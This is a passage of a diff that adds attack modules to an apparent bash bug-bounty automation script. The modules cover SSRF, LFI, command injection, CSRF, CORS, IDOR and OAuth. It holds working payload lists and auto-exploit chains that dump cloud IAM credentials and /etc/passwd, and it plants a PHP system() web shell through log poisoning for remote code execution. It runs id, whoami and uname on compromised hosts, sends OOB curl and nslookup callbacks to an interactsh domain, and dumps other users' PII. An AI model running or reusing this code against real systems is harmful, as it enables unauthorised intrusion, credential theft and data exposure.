+            log_warn "SSRF time-based candidate: $furl"
+        fi
+
+        # ── OOB (interactsh configured via env) ──────────
+        if [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
+            local rand; rand=$(head -c 6 /dev/urandom | xxd -p | head -1)
+            local oob="http://${rand}.${INTERACTSH_DOMAIN}/"
+            local oob_url; oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
+            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
+            uniq_add "$O/oob_payloads_sent.txt" "OOB_SSRF [${rand}.${INTERACTSH_DOMAIN}]: $oob_url"
+        fi
+    done < /tmp/ssrf_in_$$.txt
+    rm -f /tmp/ssrf_in_$$.txt
+
+    # ── AUTO-EXPLOIT chain: confirmed metadata/file readers ──
+    if [[ -s "$O/ssrf_confirmed.txt" ]]; then
+        log_hit "SSRF CONFIRMED: $(cnt "$O/ssrf_confirmed.txt") → auto-dumping metadata + /etc/passwd"
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
+            [[ -z "$target" ]] && continue
+            local s; s=$(safe_name "$target")
+            local meta; meta=$(echo "$target" | sed 's|http://[^/]*|http://169.254.169.254|')
+            local dump
+            dump=$(_curl "$meta/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -c 4000 || true)
+            [[ -n "$dump" ]] && { echo "### $target" >> "$O/iam_creds.txt"; echo "$dump" >> "$O/iam_creds.txt"; log_hit "IAM creds dumped for $target"; }
+            local pfile; pfile=$(echo "$target" | sed 's|http://[^/]*|file:///etc/passwd|')
+            local pb; pb=$(_curl "$pfile" 2>/dev/null | head -c 2000 || true)
+            [[ -n "$pb" ]] && { echo "### $target" >> "$O/passwd_dump.txt"; echo "$pb" >> "$O/passwd_dump.txt"; log_hit "/etc/passwd dumped for $target"; }
+        done < "$O/ssrf_confirmed.txt"
+    fi
+
+    sort -u -o "$O/ssrf_confirmed.txt"   "$O/ssrf_confirmed.txt"   2>/dev/null || true
+    sort -u -o "$O/ssrf_divergence.txt"  "$O/ssrf_divergence.txt"  2>/dev/null || true
+    log_ok "SSRF confirmed: $(cnt "$O/ssrf_confirmed.txt") · candidates: $(cnt "$O/ssrf_divergence.txt")"
 }
 
-mod_jwt_verify() {
-  step "JWT — decode · alg-none · crack queue"
-  local O="$W/js"; mkdir -p "$O"
-  [[ -s "$W/js/jwts.txt" ]] || return
-  while IFS= read -r jwt; do
-    local hdr; hdr=$(echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null || true)
-    echo "$hdr" | grep -qi '"alg"[[:space:]]*:[[:space:]]*"none"' && { echo "CRITICAL|JWT-ALG-NONE|$jwt" >> "$W/vulns/authz/jwt.txt"; qadd critical jwt "$jwt"; log H "JWT alg:none — forgeable: ${jwt:0:40}…"; }
-    [[ -s "$HOME/tools/jwt_tool/jwt_tool.py" ]] && echo "$jwt" >> "$O/jwt_crack_queue.txt"
-  done < "$W/js/jwts.txt"
-  u "$O/jwt_crack_queue.txt"
+# ══════════════════════════════════════════════════════
+# MODULE 12 — LFI  (detect + base64 decode + log-poison RCE)
+# ══════════════════════════════════════════════════════
+mod_lfi() {
+    [[ "$F_NO_EXPLOIT" == true ]] && return
+    progress "MODULE 12 — LFI"
+    log_section "MODULE 12 — LFI DETECTION + AUTO-EXPLOIT"
+    local O="$WORKSPACE/vulns/lfi"
+    mkdir -p "$O/decoded" 2>/dev/null || true
+    local LFI_IN="$WORKSPACE/urls/gf/lfi.txt"
+    [[ ! -s "$LFI_IN" ]] && LFI_IN="$WORKSPACE/urls/urls_with_params.txt"
+
+    active_filter "$LFI_IN" /tmp/lfi_in_$$.txt 40
+    local lfi_total; lfi_total=$(wc -l < /tmp/lfi_in_$$.txt 2>/dev/null || echo 0)
+    log_info "LFI: testing $lfi_total live URLs"
+
+    local -a LFI_PAYLOADS=(
+        "../../../../../../etc/passwd"
+        "../../../../../etc/passwd%00"
+        "....//....//....//etc/passwd"
+        "..%2f..%2f..%2f..%2f..%2fetc/passwd"
+        "..%252f..%252f..%252fetc%252fpasswd"
+        "/etc/passwd"
+        "php://filter/convert.base64-encode/resource=/etc/passwd"
+        "php://filter/read=convert.base64-encode/resource=/etc/passwd"
+        "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+        "file:///etc/passwd"
+        "php://filter/convert.base64-encode/resource=/proc/self/environ"
+        "php://filter/convert.base64-encode/resource=index.php"
+        "../../../../../../proc/self/environ"
+        "../../../../../../var/log/apache2/access.log"
+        "../../../../../../var/log/auth.log"
+        "..\\..\\..\\..\\..\\windows\\win.ini"
+        "....//....//....//windows/win.ini"
+        "php://input"
+        "data://text/plain;base64,PD9waHAgZWNobyAnbGZpcmNlX21hcmtlcic7ID8+"
+    )
+
+    while IFS= read -r url; do
+        for payload in "${LFI_PAYLOADS[@]}"; do
+            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
+            local body; body=$(_curl "$furl" 2>/dev/null | head -c 4000 || true)
+
+            # direct match
+            if echo "$body" | grep -qE "root:x:0:0|\[fonts\]|for 16-bit app support|\\[extensions\\]"; then
+                uniq_add "$O/lfi_confirmed.txt" "LFI_CONFIRMED: $furl"
+                log_hit "LFI: $furl"
+                echo "$body" > "$O/decoded/$(safe_name "$furl").body"
+                continue
+            fi
+            # base64-wrapped PHP filter
+            if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
+                local dec; dec=$(echo "$body" | tr -d '\n' | base64 -d 2>/dev/null || true)
+                if echo "$dec" | grep -qE "root:x:0:0|/bin/bash|application|<\?php"; then
+                    uniq_add "$O/lfi_confirmed.txt" "LFI_B64: $furl"
+                    log_hit "LFI (base64 filter): $furl"
+                    echo "### $furl" >> "$O/decoded/decoded_dump.txt"
+                    echo "$dec" >> "$O/decoded/decoded_dump.txt"
+                    echo "$dec" > "$O/decoded/$(safe_name "$furl").decoded"
+                    continue
+                fi
+            fi
+            # error oracle
+            if echo "$body" | grep -qiE "(failed to open stream|no such file|include\(|require\(|open_basedir|permission denied|path traversal)"; then
+                uniq_add "$O/lfi_error_oracle.txt" "LFI_ORACLE: $furl [$(echo "$body" | grep -oiE '(failed to open stream|no such file|include\(|require\(|open_basedir)' | head -1)]"
+            fi
+        done
+    done < /tmp/lfi_in_$$.txt
+    rm -f /tmp/lfi_in_$$.txt
+
+    # ── AUTO-EXPLOIT: log poisoning → RCE ─────────────
+    if [[ -s "$O/lfi_confirmed.txt" ]]; then
+        log_hit "LFI CONFIRMED: $(cnt "$O/lfi_confirmed.txt") → attempting log-poison RCE"
+        local marker; marker="lfirce$(head -c 4 /dev/urandom | xxd -p)"
+        local phpcode="<?php echo '${marker}'; system(\$_GET['c']); ?>"
+        local poison_url
+        # auth.log / access.log via UA injection
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
+            [[ -z "$target" ]] && continue
+            for logf in \
+                "../../../../../../var/log/auth.log" \
+                "../../../../../../var/log/apache2/access.log" \
+                "../../../../../../var/log/nginx/access.log" \
+                "../../../../../../var/log/httpd/access_log" \
+                "../../../../../../proc/self/environ"; do
+                # inject payload via User-Agent
+                local inject_url; inject_url=$(echo "$target" | qsreplace "$logf" 2>/dev/null || true)
+                _curl -A "$phpcode" --max-time 8 "$inject_url" >/dev/null 2>&1 || true
+                # trigger + execute
+                local rce_url="${inject_url}%3Fc%3Did"
+                local out; out=$(_curl -A "$phpcode" --max-time 8 "$rce_url" 2>/dev/null | head -c 2000 || true)
+                if echo "$out" | grep -qE "uid=[0-9]+|${marker}"; then
+                    uniq_add "$O/lfi_rce.txt" "LFI→RCE (log poison): ${inject_url}%3Fc%3D<cmd>"
+                    log_hit "LFI→RCE via $logf: $(echo "$out" | head -2 | tr '\n' ' ')"
+                    echo "### $target" >> "$O/rce_output.txt"
+                    echo "$out" >> "$O/rce_output.txt"
+                    break
+                fi
+            done
+        done < "$O/lfi_confirmed.txt"
+    fi
+
+    sort -u -o "$O/lfi_confirmed.txt" "$O/lfi_confirmed.txt" 2>/dev/null || true
+    sort -u -o "$O/lfi_rce.txt" "$O/lfi_rce.txt" 2>/dev/null || true
+    log_ok "LFI confirmed: $(cnt "$O/lfi_confirmed.txt") · RCE: $(cnt "$O/lfi_rce.txt")"
 }
 
-mod_takeover() {
-  step "TAKEOVER — dangling DNS/CNAME → claimable"
-  local O="$W/vulns/authz"; mkdir -p "$O"
-  local seen=""
-  while IFS= read -r sub; do
-    local cname; cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1 || true)
-    [[ -z "$cname" ]] && continue
-    local svc=""
-    case "$cname" in
-      *.github.io) svc="github" ;; *.herokuapp.com) svc="heroku" ;; *.azurewebsites.net) svc="azure"
-      *.cloudfront.net) svc="cloudfront" ;; *.s3.amazonaws.com) svc="s3" ;; *.cname.vercel-dns.com) svc="vercel"
-      *.netlify.app) svc="netlify" ;; *.pantheonsite.io) svc="pantheon" ;; *.fastly.net) svc="fastly"
-      *.shopify.com) svc="shopify" ;; *) svc="other" ;;
+# ══════════════════════════════════════════════════════
+# MODULE 13 — CMDi  (time-based + echo + OOB, then `id`)
+# ══════════════════════════════════════════════════════
+mod_cmdi() {
+    [[ "$F_NO_EXPLOIT" == true ]] && return
+    progress "MODULE 13 — Command Injection"
+    log_section "MODULE 13 — COMMAND INJECTION (cmdi)"
+    local O="$WORKSPACE/vulns/cmdi"
+    mkdir -p "$O" 2>/dev/null || true
+    local CMDI_IN="$WORKSPACE/urls/gf/cmdi.txt"
+    [[ ! -s "$CMDI_IN" ]] && CMDI_IN="$WORKSPACE/urls/urls_with_params.txt"
+    [[ ! -s "$CMDI_IN" ]] && { log_warn "No URL input for CMDi"; return; }
+
+    active_filter "$CMDI_IN" /tmp/cmdi_in_$$.txt 40
+    local cmdi_total; cmdi_total=$(wc -l < /tmp/cmdi_in_$$.txt 2>/dev/null || echo 0)
+    log_info "CMDi: testing $cmdi_total live URLs"
+
+    local rand_id; rand_id="cmdi$(head -c 6 /dev/urandom | xxd -p)"
+
+    while IFS= read -r url; do
+        local base; base=$(_curl -o /dev/null -w "%{time_total}" "$url" 2>/dev/null || echo "0.5")
+        local base_ms; base_ms=$(echo "$base * 1000 / 1" | bc 2>/dev/null || echo 500)
+
+        # 1) echo-marker payloads
+        local -a ECHO_PAYLOADS=(
+            ";echo ${rand_id}" "&&echo ${rand_id}" "|echo ${rand_id}"
+            "`echo ${rand_id}`" "$(echo ${rand_id})" ";echo%20${rand_id}"
+            "&echo ${rand_id}" "||echo ${rand_id}" "%0aecho ${rand_id}"
+            "';echo ${rand_id};'" "\"|echo ${rand_id}\""
+            "| id" "; id" "`id`" "$(id)"
+        )
+        for payload in "${ECHO_PAYLOADS[@]}"; do
+            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
+            local body; body=$(_curl --max-time 8 "$furl" 2>/dev/null | head -c 3000 || true)
+            if echo "$body" | grep -q "$rand_id"; then
+                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [echo] (${payload}): $furl"
+                log_hit "CMDi (echo): $furl :: $payload"
+                echo "### $furl [payload: $payload]" >> "$O/rce_output.txt"
+                echo "$body" | grep -E "uid=|${rand_id}" | head -5 >> "$O/rce_output.txt"
+            elif echo "$body" | grep -qE "uid=[0-9]+\(|gid=[0-9]+\(|groups?="; then
+                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [id] (${payload}): $furl"
+                log_hit "CMDi (id output): $furl :: $payload"
+                echo "### $furl [payload: $payload]" >> "$O/rce_output.txt"
+                echo "$body" | grep -E "uid=" | head -3 >> "$O/rce_output.txt"
+            fi
+        done
+
+        # 2) time-based payloads
+        local -a SLEEP_PAYLOADS=(
+            ";sleep 5" "&sleep 5" "|sleep 5" "`sleep 5`" "$(sleep 5)"
+            ";ping -c 5 127.0.0.1" "|ping -n 5 127.0.0.1"
+            "||sleep 5 #" "&ping -i 5 127.0.0.1"
+        )
+        for payload in "${SLEEP_PAYLOADS[@]}"; do
+            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
+            local t0; t0=$(date +%s%N)
+            _curl --connect-timeout 4 --max-time 15 "$furl" >/dev/null 2>&1 || true
+            local t1; t1=$(date +%s%N)
+            local elapsed=$(( (t1 - t0) / 1000000 ))
+            if [[ "$elapsed" -ge 4000 ]] && [[ "$elapsed" -gt $(( base_ms + 3000 )) ]]; then
+                uniq_add "$O/cmdi_confirmed.txt" "CMDi_CONFIRMED [time] [${elapsed}ms] (${payload}): $furl"
+                log_hit "CMDi (time-based ${elapsed}ms): $furl :: $payload"
+            fi
+        done
+
+        # 3) OOB payloads
+        if [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
+            local rand; rand=$(head -c 6 /dev/urandom | xxd -p)
+            local oob="nslookup ${rand}.${INTERACTSH_DOMAIN}"
+            local oob_url; oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
+            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
+            oob="curl http://${rand}.${INTERACTSH_DOMAIN}/"
+            oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
+            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
+            uniq_add "$O/oob_payloads_sent.txt" "OOB_CMDi [${rand}.${INTERACTSH_DOMAIN}]: $url"
+        fi
+    done < /tmp/cmdi_in_$$.txt
+    rm -f /tmp/cmdi_in_$$.txt
+
+    sort -u -o "$O/cmdi_confirmed.txt" "$O/cmdi_confirmed.txt" 2>/dev/null || true
+    if [[ -s "$O/cmdi_confirmed.txt" ]]; then
+        log_hit "CMDi CONFIRMED: $(cnt "$O/cmdi_confirmed.txt") — outputs in $O/rce_output.txt"
+        # full recon on confirmed: id / whoami / uname
+        while IFS= read -r line; do
+            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
+            local payload; payload=$(echo "$line" | grep -oP '(?<=\().*(?=\): )' || true)
+            [[ -z "$target" || -z "$payload" ]] && continue
+            local out; out=$(_curl --max-time 10 "$(echo "$target" | qsreplace "${payload}id;whoami;uname -a" 2>/dev/null || true)" 2>/dev/null | head -c 1500 || true)
+            [[ -n "$out" ]] && { echo "### RECON $target" >> "$O/host_recon.txt"; echo "$out" >> "$O/host_recon.txt"; }
+        done < "$O/cmdi_confirmed.txt"
+    fi
+    log_ok "CMDi confirmed: $(cnt "$O/cmdi_confirmed.txt")"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 14 — CSRF
+# ══════════════════════════════════════════════════════
+mod_csrf() {
+    progress "MODULE 14 — CSRF"
+    log_section "MODULE 14 — CSRF DETECTION"
+    local O="$WORKSPACE/vulns/csrf"
+    mkdir -p "$O" 2>/dev/null || true
+    local FORMS_IN="$WORKSPACE/urls/urls_dynamic.txt"
+    [[ ! -s "$FORMS_IN" ]] && FORMS_IN="$WORKSPACE/urls/urls_with_params.txt"
+
+    log_info "CSRF: scanning forms for missing tokens + weak Origin checks"
+    while IFS= read -r url; do
+        local html; html=$(_curl --max-time 10 "$url" 2>/dev/null || true)
+        # 1) token presence in forms
+        local has_form; has_form=$(echo "$html" | grep -ciE "<form" || true)
+        if [[ "$has_form" -gt 0 ]]; then
+            local has_token; has_token=$(echo "$html" | grep -ciE 'name=["'"'"'](csrf[^"'"'"']*|_token|authenticity_token|__RequestVerificationToken|xsrf[^"'"'"']*|token)' || true)
+            if [[ "$has_token" -eq 0 ]]; then
+                uniq_add "$O/csrf_no_token.txt" "CSRF_NO_TOKEN [$(echo "$html" | grep -oE '<form[^>]*action="[^"]*"' | head -3 | tr '\n' ' ')]: $url"
+            fi
+            # form actions missing CSRF
+            echo "$html" | grep -oE '<form[^>]*>' | while IFS= read -r form; do
+                local method; method=$(echo "$form" | grep -oE 'method="[^"]*"' | head -1)
+                if echo "$method" | grep -qiE "post|put|delete|patch"; then
+                    uniq_add "$O/csrf_forms.txt" "CSRF_FORM [$(echo "$form" | tr '\n' ' ' | head -c 200)]: $url"
+                fi
+            done
+        fi
+        # 2) cookie SameSite audit
+        local cookies; cookies=$(_curl -I "$url" 2>/dev/null | grep -i "^set-cookie" | head -5 || true)
+        if [[ -n "$cookies" ]]; then
+            while IFS= read -r ck; do
+                if ! echo "$ck" | grep -qiE "samesite=(strict|lax)"; then
+                    uniq_add "$O/csrf_cookies.txt" "COOKIE_NO_SAMESITE [$(echo "$ck" | cut -c1-120)]: $url"
+                fi
+            done <<< "$cookies"
+        fi
+        # 3) Origin/Referer enforcement on state-changing endpoints
+        if echo "$url" | grep -qiE "(login|logout|password|email|profile|settings|delete|update|transfer|pay|admin|account)"; then
+            local r200 r400
+            r200=$(_curl -X POST -H "Origin: https://${DOMAIN}"    -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
+            r400=$(_curl -X POST -H "Origin: https://evil.com"     -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
+            if [[ "$r400" != "403" && "$r400" != "400" && "$r400" != "406" ]] && [[ "$r200" =~ ^(200|201|204|302)$ ]]; then
+                uniq_add "$O/csrf_origin_weak.txt" "CSRF_ORIGIN_WEAK [same:${r200}/evil:${r400}]: $url"
+            fi
+        fi
+    done < <(head -120 "$FORMS_IN" 2>/dev/null)
+
+    sort -u -o "$O/csrf_no_token.txt" "$O/csrf_no_token.txt" 2>/dev/null || true
+    sort -u -o "$O/csrf_origin_weak.txt" "$O/csrf_origin_weak.txt" 2>/dev/null || true
+    [[ -s "$O/csrf_no_token.txt" ]]    && log_hit "CSRF missing tokens: $(cnt "$O/csrf_no_token.txt")"
+    [[ -s "$O/csrf_origin_weak.txt" ]] && log_hit "CSRF weak Origin checks: $(cnt "$O/csrf_origin_weak.txt")"
+    log_ok "CSRF scan complete"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 15 — CORS  (reflect + null-origin + credentials)
+# ══════════════════════════════════════════════════════
+mod_cors() {
+    progress "MODULE 15 — CORS"
+    log_section "MODULE 15 — CORS MISCONFIGURATION"
+    local O="$WORKSPACE/vulns/cors"
+    mkdir -p "$O" 2>/dev/null || true
+    local CORS_IN="$WORKSPACE/urls/urls_dynamic.txt"
+    [[ ! -s "$CORS_IN" ]] && CORS_IN="$WORKSPACE/subdomains/live_urls.txt"
+
+    log_info "CORS: testing ${CORS_IN} with evil origins"
+    local evil="https://evil.com"
+    local evil_sub="https://${DOMAIN}.evil.com"
+    local evil_suffix="https://evil${DOMAIN}"
+
+    while IFS= read -r url; do
+        for origin in "$evil" "$evil_sub" "$evil_suffix" "null"; do
+            local headers; headers=$(_curl -H "Origin: $origin" -I "$url" 2>/dev/null || true)
+            local acao; acao=$(echo "$headers" | grep -i "^access-control-allow-origin" | tr -d '\r' | head -1 || true)
+            local acac; acac=$(echo "$headers" | grep -i "^access-control-allow-credentials" | tr -d '\r' | head -1 || true)
+
+            if [[ -n "$acao" ]]; then
+                local reflected="no"
+                echo "$acao" | grep -qi "$origin" && reflected="yes"
+                if [[ "$reflected" == "yes" ]] || echo "$acao" | grep -qi "null"; then
+                    if echo "$acac" | grep -qi "true"; then
+                        uniq_add "$O/cors_confirmed.txt" "CORS_CRED [${origin}] [${acao}] [${acac}]: $url"
+                        log_hit "CORS CREDENTIALED [${origin}]: $url"
+                    else
+                        uniq_add "$O/cors_reflect.txt" "CORS_REFLECT [${origin}] [${acao}]: $url"
+                        log_warn "CORS reflected (no creds): $url"
+                    fi
+                fi
+            fi
+        done
+    done < <(head -150 "$CORS_IN" 2>/dev/null)
+
+    sort -u -o "$O/cors_confirmed.txt" "$O/cors_confirmed.txt" 2>/dev/null || true
+    sort -u -o "$O/cors_reflect.txt"   "$O/cors_reflect.txt"   2>/dev/null || true
+    [[ -s "$O/cors_confirmed.txt" ]] && log_hit "CORS confirmed: $(cnt "$O/cors_confirmed.txt")"
+    log_ok "CORS scan complete"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 16 — IDOR  (sequential diff + auto-enum)
+# ══════════════════════════════════════════════════════
+mod_idor() {
+    progress "MODULE 16 — IDOR"
+    log_section "MODULE 16 — IDOR / INSECURE DIRECT OBJECT REFERENCE"
+    local O="$WORKSPACE/vulns/idor"
+    mkdir -p "$O" 2>/dev/null || true
+    local IDOR_IN="$WORKSPACE/urls/urls_with_params.txt"
+    [[ ! -s "$IDOR_IN" ]] && IDOR_IN="$WORKSPACE/endpoints/all_endpoints.txt"
+    [[ ! -s "$IDOR_IN" ]] && { log_warn "No URLs for IDOR"; return; }
+
+    log_info "IDOR: extracting numeric IDs from URLs/endpoints..."
+    local -A seen_ids
+    grep -hoE '(id|ID|user|uid|account|acc|order|invoice|ticket|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|room|chat|conversation|payment|transaction|subscription|org|team|project|repo|issue|pr|review)(=|/)[0-9]{1,12}' \
+        "$IDOR_IN" "$WORKSPACE/js/"*.txt "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null \
+        | sort -u > /tmp/idor_parsed_$$.txt || true
+
+    # param-style: /path?id=123  → id
+    grep -oE 'https?://[^ ]*[?&](id|uid|user|account|acc|order|invoice|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|payment|transaction|org|team|project|repo|issue|pr)=[0-9]+' \
+        "$IDOR_IN" 2>/dev/null | sort -u > "$O/idor_param_urls.txt" || true
+    # path-style: /api/users/123
+    grep -oE 'https?://[^ ]*(/users?|/accounts?|/orders?|/invoices?|/files?|/documents?|/profiles?|/members?|/clients?|/customers?|/products?|/posts?|/messages?|/payments?|/transactions?|/orgs?|/teams?|/projects?|/repos?|/issues?|/pulls?|/reviews?)/[0-9]{1,12}' \
+        "$IDOR_IN" 2>/dev/null | sort -u > "$O/idor_path_urls.txt" || true
+
+    local n_param; n_param=$(wc -l < "$O/idor_param_urls.txt" 2>/dev/null || echo 0)
+    local n_path;  n_path=$(wc -l < "$O/idor_path_urls.txt" 2>/dev/null || echo 0)
+    log_info "IDOR targets: $n_param param-style + $n_path path-style"
+
+    # ── sequential diffing: param-style ────────────────
+    while IFS= read -r url; do
+        local orig_id; orig_id=$(echo "$url" | grep -oE '[?&](id|uid|user|account|acc|order|invoice|file|doc|profile|member|client|customer|product|item|post|comment|msg|message|payment|transaction|org|team|project|repo|issue|pr)=[0-9]+' | head -1)
+        local pname; pname=$(echo "$orig_id" | grep -oE '^[?&][a-zA-Z_]+' | tr -d '?&')
+        local pval;  pval=$(echo "$orig_id" | grep -oE '[0-9]+$')
+        [[ -z "$pname" || -z "$pval" ]] && continue
+        [[ -n "${seen_ids[${pname}:${pval}]:-}" ]] && continue
+        seen_ids["${pname}:${pval}"]=1
+
+        local base; base=$(_curl -o /dev/null -w "%{http_code} %{size_download}" "$url" 2>/dev/null || echo "000 0")
+        local b_code; b_code=$(echo "$base" | cut -d' ' -f1)
+        local b_size; b_size=$(echo "$base" | cut -d' ' -f2)
+        local b_body; b_body=$(_curl "$url" 2>/dev/null | head -c 800 || true)
+        local b_hash; b_hash=$(echo "$b_body" | md5sum | cut -d' ' -f1)
+        local b_haspii; b_haspii=$(echo "$b_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)
+
+        for delta in "-2" "-1" "+1" "+2" "+1000" "+999999"; do
+            local new_id=$(( pval + delta ))
+            [[ "$new_id" -lt 1 ]] && continue
+            local fuzz; fuzz=$(echo "$url" | sed "s/\([?&]${pname}=\)[0-9]*/\1${new_id}/")
+            local resp; resp=$(_curl -o /dev/null -w "%{http_code} %{size_download}" "$fuzz" 2>/dev/null || echo "000 0")
+            local r_code; r_code=$(echo "$resp" | cut -d' ' -f1)
+            local r_size; r_size=$(echo "$resp" | cut -d' ' -f2)
+            local r_body; r_body=$(_curl "$fuzz" 2>/dev/null | head -c 800 || true)
+            local r_hash; r_hash=$(echo "$r_body" | md5sum | cut -d' ' -f1)
+            local r_haspii; r_haspii=$(echo "$r_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)
+
+            if [[ "$r_code" =~ ^(200|201)$ ]] && [[ "$r_hash" != "$b_hash" ]] && \
+               { [[ "$r_haspii" -gt 0 ]] || [[ "$r_size" -gt "$b_size" ]]; }; then
+                uniq_add "$O/idor_seq_diff.txt" "IDOR [${pname}=${pval}→${new_id}] [${b_code}/${b_size}b → ${r_code}/${r_size}b] [PII:${r_haspii}]: $fuzz"
+                log_hit "IDOR candidate: $fuzz (${b_size}b → ${r_size}b)"
+                # AUTO-EXPLOIT: dump the foreign object
+                echo "### $fuzz" >> "$O/idor_dump.txt"
+                echo "$r_body" >> "$O/idor_dump.txt"
+            fi
+        done
+    done < "$O/idor_param_urls.txt"
+
+    # ── path-style sequential ──────────────────────────
+    while IFS= read -r url; do
+        local orig_id; orig_id=$(echo "$url" | grep -oE '/[0-9]{1,12}$' | tr -d '/')
+        [[ -z "$orig_id" ]] && continue
+        local new_id=$(( orig_id + 1 ))
+        local fuzz; fuzz=$(echo "$url" | sed "s|/[0-9]\{1,12\}$|/${new_id}|")
+        local r_body; r_body=$(_curl "$fuzz" 2>/dev/null | head -c 800 || true)
+        local r_code; r_code=$(_curl -o /dev/null -w "%{http_code}" "$fuzz" 2>/dev/null || echo 000)
+        local r_haspii; r_haspii=$(echo "$r_body" | grep -ciE '"(email|name|phone|ssn|address|card|iban|dob|username|role|is_admin|billing)"' || true)
+        if [[ "$r_code" =~ ^(200|201)$ ]] && [[ "$r_haspii" -gt 0 ]] && \
+           ! echo "$r_body" | grep -qiE "(not found|unauthorized|forbidden|permission)"; then
+            uniq_add "$O/idor_seq_diff.txt" "IDOR_PATH [${orig_id}→${new_id}] [$r_code] [PII:${r_haspii}]: $fuzz"
+            log_hit "IDOR path candidate: $fuzz"
+            echo "### $fuzz" >> "$O/idor_dump.txt"
+            echo "$r_body" >> "$O/idor_dump.txt"
+        fi
+    done < "$O/idor_path_urls.txt"
+
+    rm -f /tmp/idor_parsed_$$.txt
+    sort -u -o "$O/idor_seq_diff.txt" "$O/idor_seq_diff.txt" 2>/dev/null || true
+    sort -u -o "$O/idor_dump.txt" "$O/idor_dump.txt" 2>/dev/null || true
+    if [[ -s "$O/idor_seq_diff.txt" ]]; then
+        log_hit "IDOR confirmed candidates: $(cnt "$O/idor_seq_diff.txt") — dumps in idor_dump.txt"
+        grep -c "IDOR" "$O/idor_seq_diff.txt" 2>/dev/null | xargs -I{} cp "$O/idor_seq_diff.txt" "$O/idor_confirmed.txt" 2>/dev/null || true
+    fi
+    log_ok "IDOR scan complete"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 17 — OAUTH / SSO  (redirect_uri, state, token leak)
+# ══════════════════════════════════════════════════════
+mod_oauth() {
+    progress "MODULE 17 — OAuth / SSO"
+    log_section "MODULE 17 — OAUTH / SSO MISCONFIGURATION"
+    local O="$WORKSPACE/vulns/oauth"
+    mkdir -p "$O" 2>/dev/null || true
+
+    # discover OAuth endpoints from JS + endpoints + known paths
+    local oauth_src="$WORKSPACE/js/all_js_endpoints.txt $WORKSPACE/endpoints/all_endpoints.txt $WORKSPACE/js/oauth.txt"
+    grep -hoE 'https?://[^"'"'"' ]*(/oauth/[a-zA-Z/]*|/authorize[^"'"'"' ]*|/token[^"'"'"' ]*|/connect/[a-zA-Z/]*|/oidc/[a-zA-Z/]*|/sso/[a-zA-Z/]*|/saml/[a-zA-Z/]*)' \
+        $oauth_src 2>/dev/null | sort -u > "$O/oauth_endpoints.txt" || true
+
+    local OAUTH_CAND="$O/oauth_endpoints.txt"
+    if [[ ! -s "$OAUTH_CAND" ]]; then
+        log_info "No OAuth endpoints in JS/endpoints — probing known paths on main host..."
+        for p in /oauth/authorize /oauth/token /authorize /token /connect/authorize \
+                 /api/oauth/authorize /api/oauth/token /oidc/authorize /oidc/token /sso/login /login/oauth/authorize; do
+            local c; c=$(_curl -o /dev/null -w "%{http_code}" "https://$DOMAIN$p" 2>/dev/null || echo 000)
+            [[ "$c" != "000" && "$c" != "404" ]] && uniq_add "$OAUTH_CAND" "https://$DOMAIN$p [$c]"
+        done
+        sort -u -o "$OAUTH_CAND" "$OAUTH_CAND" 2>/dev/null || true
+    fi
+    log_info "OAuth endpoints: $(cnt "$OAUTH_CAND")"
+
+    local evil_redirect="${INTERACTSH_DOMAIN:-evil.com}"
+
+    while IFS= read -r line; do
+        local url; url=$(echo "$line" | grep -oP 'https?://\S+' | head -1)
+        [[ -z "$url" ]] && continue
+
+        # 1) redirect_uri open-redirect / host confusion
+        if echo "$url" | grep -qE "(authorize|connect|oidc|sso)"; then
+            for ru in \
+                "https://${evil_redirect}/" \
+                "https://${evil_redirect}/$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)" \
+                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1).${evil_redirect}/" \
+                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)@${evil_redirect}/" \
+                "https://$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)/%2f%2f${evil_redirect}" \
+                "javascript:alert(1)" \
+                "//${evil_redirect}/" \
+                "https://${evil_redirect}%2f%2f$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)"; do
+                local test_url; test_url=$(echo "$url" | sed 's|\(redirect_uri=\|redirect_uri%3d\|return_uri=\|callback=\|next=\|continue=\|returnTo=\|redirect=\).*|\1'"$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$ru" 2>/dev/null || echo "$ru")"'|')
+                local loc; loc=$(_curl -o /dev/null -w "%{redirect_url}" --max-time 8 "$test_url" 2>/dev/null || true)
+                if echo "$loc" | grep -qiE "${evil_redirect}|javascript:"; then
